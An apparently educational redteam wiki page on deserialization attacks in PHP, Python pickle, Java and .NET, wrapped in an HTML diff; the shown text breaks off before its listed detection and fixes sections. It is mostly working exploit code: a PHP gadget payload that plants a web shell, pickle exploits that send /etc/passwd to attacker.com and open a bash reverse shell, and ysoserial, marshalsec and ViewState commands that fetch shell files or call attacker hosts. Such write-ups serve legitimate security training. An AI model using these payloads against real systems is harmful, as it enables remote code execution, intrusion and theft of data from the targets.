@@ -1,0 +1,1196 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<title>Deserialization | Cookie Engineer's Cyber Wiki</title>
+
+		<!-- Meta -->
+		<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=0.5, maximum-scale=2, user-scalable=yes">
+		<meta name="mobile-web-app-capable" content="yes">
+		<meta name="mobile-web-app-status-bar-style" content="black-translucent">
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta name="creator" content="Cookie Engineer">
+		<meta name="description" content="Deserialization">
+		<meta name="keywords" content="deserialization, gadget-chains, java, php, python, rce, redteam">
+		<meta name="generator" content="Cookie Engineer's bare hands with peppermint tea and nightly VIM coding sessions">
+		<meta name="robots" content="index, follow">
+
+		<!-- Social Media -->
+		<meta property="og:title" content="Deserialization">
+		<meta property="og:site_name" content="Cookie Engineer's Wiki">
+		<meta property="og:description" content="Unsafe deserialization of user-controlled data leading to remote code execution via gadget chains">
+		<meta property="og:image" itemprop="image" content="https://cookie.engineer/design/about/cookiengineer.jpg">
+		<meta property="og:url" content="https://cookie.engineer/wiki/articles/redteam/deserialization.md">
+		<meta property="og:type" content="article">
+
+		<!-- Shitter -->
+		<meta name="twitter:card" content="summary">
+		<meta name="twitter:domain" content="cookie.engineer">
+		<meta name="twitter:title" itemprop="name" content="Deserialization">
+		<meta name="twitter:description" itemprop="description" content="Unsafe deserialization of user-controlled data leading to remote code execution via gadget chains">
+		<meta name="twitter:image" itemprop="image" content="https://cookie.engineer/design/about/cookiengineer.jpg">
+
+		<!-- Website Design -->
+		<link rel="stylesheet" href="/design/index.css">
+		<link rel="stylesheet" href="/design/highlight.css">
+		<script type="module" src="/design/index.mjs" defer></script>
+	</head>
+	<body data-layout="article">
+		<header>
+			<div><button data-action="toggle-aside" title="Toggle Sidebar" class="visible"></button><button data-action="toggle-theme" title="Switch Dark/Light Theme"></button><button data-action="toggle-font" title="Switch Dyslexic/Normal Fonts"></button><button data-action="open-website" title="Navigate to Website Index"></button><button data-action="open-wiki" title="Navigate to Wiki Index"></button></div>
+			<div><img src="/design/about/cookiengineer.png" width="32" height="32" /><h1><a href="/wiki/index.html">Cookie Engineer's Cyber Wiki</a></h1></div>
+			<div></div>
+		</header>
+
+		<div>
+		<aside class="visible">
+			<ul class="toc">
+				<li>
+					<b><a href="#overview">Overview</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#required-reading">Required Reading</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#serialization-fundamentals">Serialization Fundamentals</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#why-deserialization-is-broken">Why Deserialization Is Broken</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#php-deserialization">PHP Deserialization</a></b>
+					<ul>
+						<li><a href="#php-serialization-format">PHP Serialization Format</a></li>
+						<li><a href="#exploitable-example">Exploitable Example</a></li>
+						<li><a href="#payload-construction">Payload construction</a></li>
+						<li><a href="#key-exploitation-vectors">Key Exploitation Vectors</a></li>
+						<li><a href="#common-framework-gadget-chains">Common Framework Gadget Chains</a></li>
+						<li><a href="#monolog-psr-3-logger">Monolog (PSR-3 logger)</a></li>
+						<li><a href="#swiftmailer">SwiftMailer</a></li>
+						<li><a href="#guzzle-http-client">Guzzle (HTTP client)</a></li>
+						<li><a href="#phpggc-php-generic-gadget-chains">PHPGGC: PHP Generic Gadget Chains</a></li>
+						<li><a href="#manual-payload-verification">Manual Payload Verification</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#python-pickle-deserialization">Python Pickle Deserialization</a></b>
+					<ul>
+						<li><a href="#why-pickle-is-inherently-dangerous">Why Pickle Is Inherently Dangerous</a></li>
+						<li><a href="#pickle-opcodes">Pickle Opcodes</a></li>
+						<li><a href="#manual-pickle-payload-construction">Manual Pickle Payload Construction</a></li>
+						<li><a href="#vulnerable-flask-app">Vulnerable Flask App</a></li>
+						<li><a href="#exploit">Exploit</a></li>
+						<li><a href="#beyond-reduce-with-subprocess">Beyond __reduce__ with subprocess</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#java-deserialization">Java Deserialization</a></b>
+					<ul>
+						<li><a href="#java-serialization-magic-bytes">Java Serialization Magic Bytes</a></li>
+						<li><a href="#gadget-chain-anatomy">Gadget Chain Anatomy</a></li>
+						<li><a href="#commonscollections-chain-simplified">CommonsCollections chain (simplified)</a></li>
+						<li><a href="#ysoserial">ysoserial</a></li>
+						<li><a href="#common-gadget-chains-by-jre-version">Common Gadget Chains by JRE Version</a></li>
+						<li><a href="#detection-urldns-gadget">Detection: URLDNS Gadget</a></li>
+						<li><a href="#marshalsec-payload-generator">marshalsec Payload Generator</a></li>
+						<li><a href="#custom-java-deserialization-test">Custom Java Deserialization Test</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#net-deserialization">.NET Deserialization</a></b>
+					<ul>
+						<li><a href="#viewstate-deserialization">ViewState Deserialization</a></li>
+						<li><a href="#binaryformatter-gadgets">BinaryFormatter Gadgets</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#yaml-deserialization">YAML Deserialization</a></b>
+					<ul>
+						<li><a href="#exploitation">Exploitation</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#ruby-marshal-deserialization">Ruby Marshal Deserialization</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#detection">Detection</a></b>
+					<ul>
+						<li><a href="#content-type-headers">Content-Type Headers</a></li>
+						<li><a href="#base64-detection">Base64 Detection</a></li>
+						<li><a href="#java-specific">Java-specific</a></li>
+						<li><a href="#binary-scanning">Binary scanning</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#fixes">Fixes</a></b>
+					<ul>
+						<li><a href="#if-you-must-deserialize">If you must deserialize</a></li>
+						<li><a href="#java-objectinputfilter-example-java-9">Java ObjectInputFilter example (Java 9+)</a></li>
+						<li><a href="#python-unpickler-override">Python Unpickler override</a></li>
+						<li><a href="#hmac-signing-for-integrity">HMAC Signing for Integrity</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#common-mistakes">Common Mistakes</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#challenge">Challenge</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#references">References</a></b>
+					<ul>
+					</ul>
+				</li>
+			</ul>
+		</aside>
+
+			<main>
+				<nav aria-label="breadcrumbs">
+					<ol>
+						<li><a href="/wiki/index.html">Wiki</a></li>
+						<li><a href="/wiki/articles/redteam/index.html">Redteam</a></li>
+						<li aria-current="page"><a href="/wiki/articles/redteam/deserialization.html">Deserialization</a></li>
+					</ol>
+				</nav>
+
+				<article>
+					<h2 id="deserialization">Deserialization</h2>
+					<p>Unsafe deserialization of user-controlled data leading to remote code execution via gadget chains</p>
+					<section>
+						<h3 id="overview">Overview</h3>
+						<p>
+							Deserialization reconstructs live objects from a byte stream, and any program that does so from
+							user-controlled input lets the attacker choose which classes are instantiated and with what
+							properties. This article explains why that is dangerous, demonstrates exploitable examples in
+							<abbr title="PHP Hypertest Preprocessor">PHP</abbr>
+							, Python, Java, .NET,
+							<abbr title="Yet Another Markup Language">YAML</abbr>
+							, and Ruby, and walks through the gadget-chain tooling that turns a serialized cookie or request
+							body into remote code execution.
+						</p>
+					</section>
+					<section>
+						<h3 id="required-reading">Required Reading</h3>
+						<ul>
+							<li><a href="/wiki/articles/fundamentals/http.html">/wiki/articles/fundamentals/http.html</a> - <abbr title="Hypertext Transfer Protocol">HTTP</abbr> cookies, request body content negotiation, serialization format headers</li>
+							<li><a href="/wiki/articles/fundamentals/processes.html">/wiki/articles/fundamentals/processes.html</a> - execve, code execution, process creation, command injection primitives</li>
+						</ul>
+					</section>
+					<section>
+						<h3 id="serialization-fundamentals">Serialization Fundamentals</h3>
+						<p>
+							Serialization converts an object's state into a byte stream for storage or transmission. Deserialization
+							reconstructs the object from that byte stream. The core danger: when a program deserializes
+							attacker-controlled data, the reconstruction process can be hijacked to execute arbitrary code.
+						</p>
+						<p>
+							Serialization exists because programs need to persist state across network boundaries. A
+							<abbr title="PHP Hypertest Preprocessor">PHP</abbr>
+							application stores session data. A Python web server caches complex objects in Redis. A Java
+							microservice sends DTOs over RMI. Every language has its own format.
+						</p>
+						<pre class="plaintext">
+Network Request → Deserialize(User Data) → Object Instantiated → Code Runs
+						</pre>
+					</section>
+					<section>
+						<h3 id="why-deserialization-is-broken">Why Deserialization Is Broken</h3>
+						<p>
+							Object construction is not initialization. In most languages, classes define special methods
+							that run automatically during deserialization. These methods were designed for legitimate reconstruction
+							tasks - restoring database connections, re-attaching file handles, re-validating invariants.
+							But an attacker who controls the serialized payload controls which classes get instantiated,
+							in what order, with what properties.
+						</p>
+						<p>
+							A
+							<b>gadget chain</b>
+							is a sequence of existing classes in the application's classpath that, when
+							deserialized in a specific order with specific property values, culminates in arbitrary code
+							execution. Each "gadget" does something useful: write to a file, execute a command, make a network
+							request. Chaining them together produces the full exploit.
+						</p>
+						<pre class="plaintext">
+Gadget A (triggered on deserialization)
+  → modifies property of Gadget B
+    → Gadget B&#39;s destructor fires
+      → calls system() with attacker-controlled string
+						</pre>
+					</section>
+					<section>
+						<h3 id="php-deserialization">PHP Deserialization</h3>
+						<p>
+							<abbr title="PHP Hypertest Preprocessor">PHP</abbr>
+							's
+							<code>serialize()</code>
+							and
+							<code>unserialize()</code>
+							are the oldest and most
+							notorious examples.
+							<abbr title="PHP Hypertest Preprocessor">PHP</abbr>
+							objects have
+							<b>magic methods</b>
+							- functions
+							with reserved names that the engine calls automatically.
+						</p>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Magic Method</th>
+									<th align="center">Trigger Condition</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center"><code>__wakeup()</code></td>
+									<td align="center">Called immediately after<code>unserialize()</code></td>
+								</tr>
+								<tr>
+									<td align="center"><code>__destruct()</code></td>
+									<td align="center">Called when object is destroyed (script end, unset)</td>
+								</tr>
+								<tr>
+									<td align="center"><code>__toString()</code></td>
+									<td align="center">Called when object is cast to string (echo, concatenation)</td>
+								</tr>
+								<tr>
+									<td align="center"><code>__construct()</code></td>
+									<td align="center">Called when object is created with<code>new</code></td>
+								</tr>
+								<tr>
+									<td align="center"><code>__call()</code></td>
+									<td align="center">Called when invoking inaccessible methods</td>
+								</tr>
+								<tr>
+									<td align="center"><code>__get()</code>/<code>__set()</code></td>
+									<td align="center">Called when reading/writing inaccessible properties</td>
+								</tr>
+								<tr>
+									<td align="center"><code>__sleep()</code></td>
+									<td align="center">Called before<code>serialize()</code>, returns properties to serialize</td>
+								</tr>
+							</tbody>
+						</table>
+						<h4 id="php-serialization-format">PHP Serialization Format</h4>
+						<pre class="plaintext">
+O:8:&#34;UserInfo&#34;:3:{s:4:&#34;name&#34;;s:4:&#34;root&#34;;s:3:&#34;uid&#34;;i:0;s:7:&#34;isAdmin&#34;;b:1;}
+						</pre>
+						<p>
+							Parsed: Object of class
+							<code>UserInfo</code>
+							(8 chars), 3 properties. String
+							<code>name</code>
+							=
+							<code>root</code>
+							(4 chars).
+							Integer
+							<code>uid</code>
+							= 0. Boolean
+							<code>isAdmin</code>
+							= true.
+						</p>
+						<p>
+							The format encodes type explicitly:
+							<code>s</code>
+							for string,
+							<code>i</code>
+							for integer,
+							<code>b</code>
+							for boolean,
+							<code>d</code>
+							for
+							float,
+							<code>a</code>
+							for array,
+							<code>O</code>
+							for object,
+							<code>N</code>
+							for null.
+						</p>
+						<h4 id="exploitable-example">Exploitable Example</h4>
+						<pre class="php">
+&lt;?php
+// File: app/model/Logger.php
+class Logger {
+    public $log_file;
+    public $message;
+
+    function __destruct() {
+        file_put_contents($this-&gt;log_file, $this-&gt;message, FILE_APPEND);
+    }
+}
+
+// File: public/profile.php
+$cookie = base64_decode($_COOKIE[&#39;user_data&#39;]);
+$user = unserialize($cookie);
+echo &#34;Welcome, &#34; . $user-&gt;name;
+						</pre>
+						<p>
+							The
+							<code>Logger</code>
+							class has a
+							<code>__destruct()</code>
+							that writes to an arbitrary file. The attacker cannot
+							instantiate it directly, but
+							<code>unserialize()</code>
+							can.
+						</p>
+						<h4 id="payload-construction">Payload construction</h4>
+						<pre class="php">
+&lt;?php
+class Logger {
+    public $log_file = &#39;/var/www/html/shell.php&#39;;
+    public $message = &#39;&lt;?php system($_GET[&#34;cmd&#34;]); ?&gt;&#39;;
+}
+
+$payload = serialize(new Logger());
+echo base64_encode($payload);
+// Output: Tzo2OiJMb2dnZXIiOjI6e3M6ODoibG9nX2ZpbGUiO3M6MjQ6Ii92YXIvd3d3L2h0bWwvc2hlbGwucGhwIjtzOjc6Im1lc3NhZ2UiO3M6MzA6Ijw/cGhwIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/PiI7fQ==
+						</pre>
+						<p>
+							Send as cookie, visit
+							<code>/profile.php</code>
+							, then access
+							<code>/shell.php?cmd=id</code>
+							.
+						</p>
+						<h4 id="key-exploitation-vectors">Key Exploitation Vectors</h4>
+						<p>
+							<b>1. Modifying property counts to bypass '__wakeup()' (CVE-2016-7124):</b>
+							If the serialized object
+							claims more properties than the class actually has,
+							<code>__wakeup()</code>
+							is skipped, but
+							<code>__destruct()</code>
+							still runs.
+						</p>
+						<pre class="php">
+// Normal: O:6:&#34;Logger&#34;:2:{...}
+// Bypass: O:6:&#34;Logger&#34;:3:{...}  ← claims 3 properties, has 2
+						</pre>
+						<p>
+							<b>2. PHAR deserialization with 'phar://' wrapper:</b>
+							
+							<abbr title="PHP Hypertest Preprocessor">PHP</abbr>
+							's
+							<code>phar://</code>
+							stream wrapper deserializes metadata when any file operation function touches a PHAR archive.
+							<code>file_exists(&#39;phar://evil.phar&#39;)</code>
+							triggers deserialization.
+						</p>
+						<pre class="php">
+&lt;?php
+$phar = new Phar(&#39;evil.phar&#39;);
+$phar-&gt;startBuffering();
+$phar-&gt;addFromString(&#39;test.txt&#39;, &#39;text&#39;);
+$phar-&gt;setStub(&#39;&lt;?php __HALT_COMPILER(); ?&gt;&#39;);
+$phar-&gt;setMetadata(new Logger());
+$phar-&gt;stopBuffering();
+						</pre>
+						<h4 id="common-framework-gadget-chains">Common Framework Gadget Chains</h4>
+						<h4 id="monolog-psr-3-logger">Monolog (PSR-3 logger)</h4>
+						<p>
+							Monolog's
+							<code>SyslogUdpHandler</code>
+							writes to a
+							<abbr title="User Datagram Protocol">UDP</abbr>
+							socket.
+							<code>BufferHandler</code>
+							flushes on destruct. The chain:
+						</p>
+						<pre class="plaintext">
+Monolog\Handler\SyslogUdpHandler::__destruct()
+  → close() → socket_write()
+						</pre>
+						<p>
+							With controlled host/port, you can exfiltrate data or
+							<abbr title="Server-Side Request Forgery">SSRF</abbr>
+							.
+						</p>
+						<h4 id="swiftmailer">SwiftMailer</h4>
+						<pre class="plaintext">
+Swift_ByteStream_FileByteStream → __destruct() → unlink()
+Swift_ByteStream_TemporaryFileByteStream → path traversal in temp file
+						</pre>
+						<h4 id="guzzle-http-client">Guzzle (HTTP client)</h4>
+						<pre class="plaintext">
+GuzzleHttp\Cookie\FileCookieJar::__destruct()
+  → save() → file_put_contents()
+						</pre>
+						<p>Same pattern as the Logger example - arbitrary file write on destruct.</p>
+						<h4 id="phpggc-php-generic-gadget-chains">PHPGGC: PHP Generic Gadget Chains</h4>
+						<p>
+							<abbr title="PHP Hypertest Preprocessor">PHP</abbr>
+							GGC automates gadget chain generation for
+							<abbr title="PHP Hypertest Preprocessor">PHP</abbr>
+							deserialization.
+						</p>
+						<pre class="bash">
+git clone https://github.com/ambionics/phpggc.git
+cd phpggc
+
+# List all gadget chains
+./phpggc -l
+
+# List specific framework gadgets
+./phpggc -l Laravel
+./phpggc -l Monolog
+
+# Generate payload for Monolog/RCE1
+./phpggc Monolog/RCE1 system &#39;id&#39;
+
+# Generate base64-encoded payload
+./phpggc Monolog/RCE1 system &#39;id&#39; -b
+
+# URL-encode the payload
+./phpggc Monolog/RCE1 system &#39;id&#39; -u
+
+# Generate PHAR file
+./phpggc -p phar Monolog/RCE1 system &#39;id&#39; -o exploit.phar
+						</pre>
+						<h4 id="manual-payload-verification">Manual Payload Verification</h4>
+						<p>After constructing a payload, verify it deserializes correctly:</p>
+						<pre class="php">
+&lt;?php
+$payload = &#39;Tzo2OiJMb2dnZXIiOjI6e3M6ODoibG9nX2ZpbGUiO3M6MjQ6Ii92YXIvd3d3L2h0bWwvc2hlbGwucGhwIjtzOjc6Im1lc3NhZ2UiO3M6MzA6Ijw/cGhwIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/PiI7fQ==&#39;;
+$decoded = base64_decode($payload);
+$obj = unserialize($decoded);
+var_dump($obj);
+// object(Logger)#1 (2) { [&#34;log_file&#34;]=&gt; string(24)... [&#34;message&#34;]=&gt; string(30)... }
+						</pre>
+					</section>
+					<section>
+						<h3 id="python-pickle-deserialization">Python Pickle Deserialization</h3>
+						<p>
+							Python's
+							<code>pickle</code>
+							module serializes Python objects to a binary format. It's fundamentally unsafe
+							because
+							<code>pickle.loads()</code>
+							executes arbitrary code through the
+							<b>Pickle Virtual Machine (PVM)</b>
+							.
+						</p>
+						<h4 id="why-pickle-is-inherently-dangerous">Why Pickle Is Inherently Dangerous</h4>
+						<p>
+							Pickle doesn't serialize data - it serializes
+							<b>instructions for how to reconstruct an object</b>
+							. The P
+							<abbr title="Virtual Machine">VM</abbr>
+							is a stack-based interpreter. The
+							<code>R</code>
+							(reduce) opcode calls
+							<code>__reduce__</code>
+							or
+							<code>__reduce_ex__</code>
+							on a class, which can return a callable and arguments. The P
+							<abbr title="Virtual Machine">VM</abbr>
+							executes that callable.
+						</p>
+						<pre class="python">
+import pickle
+import os
+
+class Exploit:
+    def __reduce__(self):
+        return (os.system, (&#39;id&#39;,))
+
+payload = pickle.dumps(Exploit())
+# The payload contains the instructions: load os.system, load &#39;id&#39;, call
+
+# On the victim server:
+pickle.loads(payload)  # executes os.system(&#39;id&#39;)
+						</pre>
+						<h4 id="pickle-opcodes">Pickle Opcodes</h4>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Opcode</th>
+									<th align="center">Name</th>
+									<th align="center">Description</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center"><code>c</code></td>
+									<td align="center">GLOBAL</td>
+									<td align="center">Push a global object (module.name)</td>
+								</tr>
+								<tr>
+									<td align="center"><code>(</code></td>
+									<td align="center">MARK</td>
+									<td align="center">Push mark object onto stack</td>
+								</tr>
+								<tr>
+									<td align="center"><code>R</code></td>
+									<td align="center">REDUCE</td>
+									<td align="center">Pop args and callable, execute</td>
+								</tr>
+								<tr>
+									<td align="center"><code>o</code></td>
+									<td align="center">OBJ</td>
+									<td align="center">Build object (like REDUCE but with class)</td>
+								</tr>
+								<tr>
+									<td align="center"><code>S</code></td>
+									<td align="center">STRING</td>
+									<td align="center">Push a string literal</td>
+								</tr>
+								<tr>
+									<td align="center"><code>i</code></td>
+									<td align="center">INST</td>
+									<td align="center">Instantiate a class</td>
+								</tr>
+								<tr>
+									<td align="center"><code>.</code></td>
+									<td align="center">STOP</td>
+									<td align="center">End of pickle stream</td>
+								</tr>
+							</tbody>
+						</table>
+						<h4 id="manual-pickle-payload-construction">Manual Pickle Payload Construction</h4>
+						<pre class="python">
+import pickle
+import pickletools
+
+# Construct a payload that imports os and calls system
+# Protocol 0 (ASCII) for readability
+exploit = b&#34;cos\nsystem\n(S&#39;id&#39;\ntR.&#34;
+
+pickletools.dis(exploit)
+#     0: c    GLOBAL     &#39;os system&#39;
+#    11: (    MARK
+#    12: S        STRING     &#39;id&#39;
+#    18: t        TUPLE      (MARK at 11)
+#    19: R    REDUCE
+#    20: .    STOP
+
+pickle.loads(exploit)  # executes id
+						</pre>
+						<h4 id="vulnerable-flask-app">Vulnerable Flask App</h4>
+						<pre class="python">
+# app.py
+from flask import Flask, request, make_response
+import pickle
+import base64
+
+app = Flask(__name__)
+
+class UserSession:
+    def __init__(self, username, role=&#39;user&#39;):
+        self.username = username
+        self.role = role
+
+def get_session():
+    cookie = request.cookies.get(&#39;session&#39;)
+    if not cookie:
+        return UserSession(&#39;anonymous&#39;)
+    try:
+        decoded = base64.b64decode(cookie.encode())
+        return pickle.loads(decoded)
+    except:
+        return UserSession(&#39;anonymous&#39;)
+
+@app.route(&#39;/&#39;)
+def index():
+    session = get_session()
+    return f&#39;Welcome {session.username}, role: {session.role}&#39;
+
+@app.route(&#39;/admin&#39;)
+def admin():
+    session = get_session()
+    if session.role != &#39;admin&#39;:
+        return &#39;Access denied&#39;, 403
+    return &#39;Admin panel - sensitive data here&#39;
+
+if __name__ == &#39;__main__&#39;:
+    app.run(host=&#39;0.0.0.0&#39;, port=5000)
+						</pre>
+						<h4 id="exploit">Exploit</h4>
+						<pre class="python">
+import requests
+import pickle
+import base64
+import os
+
+class RCE:
+    def __reduce__(self):
+        cmd = &#39;curl http://attacker.com/$(cat /etc/passwd|base64)&#39;
+        return (os.system, (cmd,))
+
+payload = base64.b64encode(pickle.dumps(RCE())).decode()
+r = requests.get(&#39;http://target:5000/&#39;, cookies={&#39;session&#39;: payload})
+# Command executes server-side
+
+# Alternative: get a reverse shell
+class ReverseShell:
+    def __reduce__(self):
+        cmd = &#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1&#34;&#39;
+        return (os.system, (cmd,))
+
+payload = base64.b64encode(pickle.dumps(ReverseShell())).decode()
+						</pre>
+						<h4 id="beyond-reduce-with-subprocess">Beyond <code>__reduce__</code> with subprocess</h4>
+						<pre class="python">
+import pickle
+
+# Pickle can call any callable in the global scope
+payload = b&#34;csubprocess\ncheck_output\n(S&#39;id&#39;\ntR.&#34;
+# Calls subprocess.check_output(&#39;id&#39;)
+
+# Using os.popen for output
+payload = b&#34;cos\npopen\n(S&#39;id&#39;\ntR.&#34;
+						</pre>
+					</section>
+					<section>
+						<h3 id="java-deserialization">Java Deserialization</h3>
+						<p>
+							Java deserialization via
+							<code>ObjectInputStream.readObject()</code>
+							is the most exploited deserialization
+							vulnerability class. The Java runtime has thousands of classes, and many have
+							<code>readObject()</code>
+							,
+							<code>readResolve()</code>
+							,
+							<code>validateObject()</code>
+							methods that do dangerous things.
+						</p>
+						<h4 id="java-serialization-magic-bytes">Java Serialization Magic Bytes</h4>
+						<p>
+							Java serialized objects always start with the magic bytes
+							<code>ac ed 00 05</code>
+							. If you see these in
+							a base64-encoded cookie or POST body, you've found a Java deserialization endpoint.
+						</p>
+						<pre class="bash">
+echo &#39;rO0ABXNy...&#39; | base64 -d | xxd | head -1
+# 00000000: aced 0005 7372...
+						</pre>
+						<h4 id="gadget-chain-anatomy">Gadget Chain Anatomy</h4>
+						<p>A typical Java gadget chain uses these primitives:</p>
+						<ol>
+							<li><b>Trigger class</b> - something with a <code>readObject()</code> that does something useful</li>
+							<li><b>Transformer class</b> - transforms one object into another</li>
+							<li><b>Sink</b> - executes a command, writes a file, loads a class</li>
+						</ol>
+						<h4 id="commonscollections-chain-simplified">CommonsCollections chain (simplified)</h4>
+						<pre class="plaintext">
+AnnotationInvocationHandler.readObject()
+  → memberValues.entrySet()
+    → LazyMap.get()
+      → ChainedTransformer.transform()
+        → ConstantTransformer (return Runtime.class)
+        → InvokerTransformer (Runtime.getRuntime())
+        → InvokerTransformer (exec(&#39;cmd&#39;))
+						</pre>
+						<h4 id="ysoserial">ysoserial</h4>
+						<p>
+							<code>ysoserial</code>
+							is the standard tool for generating Java deserialization exploits.
+						</p>
+						<pre class="bash">
+git clone https://github.com/frohoff/ysoserial.git
+cd ysoserial
+mvn package -DskipTests
+
+# List all payload types
+java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar
+
+# Generate payloads
+java -jar ysoserial.jar CommonsCollections1 &#39;curl http://attacker/$(whoami)&#39; \
+  | base64 -w0
+
+java -jar ysoserial.jar CommonsCollections5 &#39;bash -c {echo,BASE64_ENCODED_REVERSE_SHELL}|{base64,-d}|{bash,-i}&#39; \
+  &gt; payload.ser
+
+java -jar ysoserial.jar Spring1 &#39;wget http://attacker/shell.jsp -O /var/www/html/shell.jsp&#39;
+
+java -jar ysoserial.jar URLDNS &#39;http://COLLABORATOR_ID.burpcollaborator.net&#39; \
+  | base64 -w0 &gt; dns.ser
+
+# Common payload types
+java -jar ysoserial.jar JRMPClient &#39;attacker.com:1099&#39;
+java -jar ysoserial.jar JRMPListener 1099 CommonsCollections5 &#39;id&#39;
+						</pre>
+						<h4 id="common-gadget-chains-by-jre-version">Common Gadget Chains by JRE Version</h4>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Chain</th>
+									<th align="center">JRE 1.7</th>
+									<th align="center">JRE 1.8</th>
+									<th align="center">Notes</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center">CommonsCollections1</td>
+									<td align="center">Yes</td>
+									<td align="center">< 8u71</td>
+									<td align="center">Requires<code>commons-collections:3.1</code></td>
+								</tr>
+								<tr>
+									<td align="center">CommonsCollections3</td>
+									<td align="center">Yes</td>
+									<td align="center">< 8u71</td>
+									<td align="center">Variant using<code>InstantiateTransformer</code></td>
+								</tr>
+								<tr>
+									<td align="center">CommonsCollections5</td>
+									<td align="center">Yes</td>
+									<td align="center">All</td>
+									<td align="center">Uses<code>BadAttributeValueExpException</code></td>
+								</tr>
+								<tr>
+									<td align="center">CommonsCollections6</td>
+									<td align="center">Yes</td>
+									<td align="center">All</td>
+									<td align="center">Uses<code>TiedMapEntry.hashCode()</code></td>
+								</tr>
+								<tr>
+									<td align="center">CommonsCollections7</td>
+									<td align="center">Yes</td>
+									<td align="center">All</td>
+									<td align="center">Uses<code>Hashtable.readObject()</code></td>
+								</tr>
+								<tr>
+									<td align="center">Spring1</td>
+									<td align="center">Yes</td>
+									<td align="center">Yes</td>
+									<td align="center">Requires<code>spring-core</code></td>
+								</tr>
+								<tr>
+									<td align="center">Spring2</td>
+									<td align="center">Yes</td>
+									<td align="center">Yes</td>
+									<td align="center">Uses<code>JtaTransactionManager</code>JNDI</td>
+								</tr>
+								<tr>
+									<td align="center">Groovy1</td>
+									<td align="center">Yes</td>
+									<td align="center">Yes</td>
+									<td align="center">Requires<code>groovy</code>library</td>
+								</tr>
+								<tr>
+									<td align="center">Jdk7u21</td>
+									<td align="center">7u21</td>
+									<td align="center">No</td>
+									<td align="center">Pure JDK gadget, no libraries needed</td>
+								</tr>
+								<tr>
+									<td align="center">Jdk8u20</td>
+									<td align="center">No</td>
+									<td align="center">8u20</td>
+									<td align="center">Uses<code>BeanContextSupport</code></td>
+								</tr>
+								<tr>
+									<td align="center">URLDNS</td>
+									<td align="center">Yes</td>
+									<td align="center">Yes</td>
+									<td align="center">For detection only, no RCE</td>
+								</tr>
+							</tbody>
+						</table>
+						<h4 id="detection-urldns-gadget">Detection: URLDNS Gadget</h4>
+						<p>
+							The
+							<code>URLDNS</code>
+							gadget causes a
+							<abbr title="Domain Name System">DNS</abbr>
+							lookup. No dependencies needed. Ideal
+							for blind detection.
+						</p>
+						<pre class="bash">
+java -jar ysoserial.jar URLDNS &#39;http://YOUR_COLLABORATOR.burpcollaborator.net&#39; \
+  | base64 -w0
+
+# Send this as a cookie, POST body, or parameter
+# If the target does a DNS lookup for your collaborator domain, you&#39;ve confirmed deserialization
+curl -X POST &#39;http://target/endpoint&#39; \
+  -H &#39;Content-Type: application/x-java-serialized-object&#39; \
+  --data-binary @dns.ser
+						</pre>
+						<h4 id="marshalsec-payload-generator">marshalsec Payload Generator</h4>
+						<pre class="bash">
+git clone https://github.com/mbechler/marshalsec.git
+cd marshalsec
+mvn package -DskipTests
+
+# JNDI injection via LDAP (for JDK &lt; 8u191)
+java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \
+  http://attacker.com:8080/#EvilClass 1389
+
+# Generate marshalsec payload
+java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Jackson \
+  -Y commons-collections4 &#39;curl http://attacker/$(hostname)&#39;
+						</pre>
+						<h4 id="custom-java-deserialization-test">Custom Java Deserialization Test</h4>
+						<pre class="java">
+import java.io.*;
+import java.util.Base64;
+
+public class DeserTest {
+    public static void main(String[] args) throws Exception {
+        // Read base64 payload from ysoserial
+        String b64 = &#34;rO0ABXNy...&#34;;
+        byte[] data = Base64.getDecoder().decode(b64);
+
+        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
+        ois.readObject();  // triggers gadget chain
+    }
+}
+						</pre>
+					</section>
+					<section>
+						<h3 id="net-deserialization">.NET Deserialization</h3>
+						<p>
+							.NET deserialization via
+							<code>BinaryFormatter</code>
+							or
+							<code>ObjectStateFormatter</code>
+							(ViewState) is equally
+							dangerous. The standard tool is
+							<b>ysoserial.net</b>
+							.
+						</p>
+						<h4 id="viewstate-deserialization">ViewState Deserialization</h4>
+						<p>
+							ASP.NET ViewState is a base64-encoded hidden field (
+							<code>__VIEWSTATE</code>
+							). If
+							<code>EnableViewStateMac=false</code>
+							and the validation key is known/absent, the ViewState can be deserialized to execute code.
+						</p>
+						<pre class="bash">
+# With ysoserial.net (from a Windows machine or via wine)
+ysoserial.exe -p ViewState -g TextFormattingRunProperties \
+  -c &#34;ping attacker.com&#34; --path=&#34;/&#34; --apppath=&#34;/&#34; --decryptionalg=&#34;3DES&#34; \
+  --decryptionkey=&#34;&#34; --validationalg=&#34;SHA1&#34; --validationkey=&#34;&#34;
+						</pre>
+						<h4 id="binaryformatter-gadgets">BinaryFormatter Gadgets</h4>
